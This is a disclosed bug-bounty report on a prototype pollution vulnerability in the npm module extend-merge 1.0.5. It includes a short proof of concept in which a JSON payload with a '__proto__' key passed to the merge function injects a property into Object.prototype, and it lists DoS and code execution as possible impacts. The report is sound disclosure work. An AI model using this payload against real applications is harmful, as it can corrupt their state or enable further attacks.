# [extend-merge] Prototype pollution

## Report Details
- **Report ID**: 878339
- **URL**: https://hackerone.com/reports/878339
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-19T19:34:31.760Z
- **Disclosed**: 2020-09-06T13:00:50.364Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `prototype pollution` vulnerability in `extend-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `extend-merge`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/extend-merge`

## Module Description

Shallow extend and deep merge utility function.

## Module Stats

[48] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `extend-merge` module:
    - `npm i extend-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const extend_merge = require('extend-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
extend_merge.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835068}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Attachments
- extend-merge_poc.mov
